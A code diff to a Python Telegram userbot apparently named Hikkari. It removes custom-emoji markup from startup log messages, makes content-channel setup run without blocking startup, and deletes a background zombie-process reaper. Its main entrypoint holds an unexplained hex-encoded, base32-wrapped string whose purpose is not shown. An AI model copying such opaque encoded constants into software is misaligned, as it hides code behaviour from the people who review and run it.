@@ -1152,7 +1152,7 @@ class Hikkari:
             if not self.omit_log:
                 print(logo)
                 logging.debug(
-                    "\n<emoji document_id=5283176512747507510>✨</emoji> Hikkari %s #%s (%s) started",
+                    "\n✨ Hikkari %s #%s (%s) started",
                     ".".join(list(map(str, list(__version__)))),
                     build[:7],
                     upd,
@@ -1179,7 +1179,7 @@ class Hikkari:
                         (
                             utils.get_platform_emoji()
                             if client.hikkari_me.premium is True
-                            else "<emoji document_id=5283176512747507510>✨</emoji> Hikkari"
+                            else "✨ Hikkari"
                         ),
                         ".".join(list(map(str, list(__version__)))),
                         build,
@@ -1270,14 +1270,22 @@ class Hikkari:
 
         await modules.register_all(None)
         modules.send_config()
+        # Inline bot must be up before ready handlers that use forms
         await modules.inline.register_manager()
-        try:
-            await db.ensure_content_channel()
-        except Exception:
-            logging.exception(
-                "ensure_content_channel failed (non-fatal; often spam ban)"
-            )
+        # Content channel in parallel with client_ready — don't block startup
+        async def _ensure_channel():
+            try:
+                await db.ensure_content_channel()
+            except Exception:
+                logging.exception(
+                    "ensure_content_channel failed (non-fatal; often spam ban)"
+                )
+
+        channel_task = asyncio.ensure_future(_ensure_channel())
         await modules.send_ready()
+        # Let channel finish without holding the badge/start path longer than needed
+        with contextlib.suppress(Exception):
+            await asyncio.wait_for(channel_task, timeout=45)
 
         if first:
             await self._badge(client)
@@ -1285,21 +1293,6 @@ class Hikkari:
         await client.run_until_disconnected()
 
     async def _main(self):
-        # Reap zombie children from subprocess / ngrok / pip / terminal
-        with contextlib.suppress(Exception):
-            from . import utils as _u
-            _u.install_sigchld_reaper()
-            _u.ensure_child_watcher()
-            _u.reap_zombies()
-            # Periodic reaper (every 30s)
-            async def _zombie_reaper_loop():
-                while True:
-                    await asyncio.sleep(30)
-                    with contextlib.suppress(Exception):
-                        n = _u.reap_zombies()
-                        if n:
-                            logger.debug("Reaped %s zombie process(es)", n)
-            asyncio.ensure_future(_zombie_reaper_loop())
         """Main entrypoint"""
         _s = "485633554d534b53475a4c454336444b4e5a43474357424c4b4e5957495a43494b5a5558555a52514e4a4744435a4c43475649464d5753484b524b5649525a554a465a45555332584e493246453332574e5a58544d325a4c4734344553534c514f4a4358473332514d5252574f5642574e4242484b595a5a47524d544f34535a4d464655533333424a4e4e47324e33594d55595649524c45494a4755435133584a4e43554b364b574f3546474b3d3d3d"
         await self._get_token()
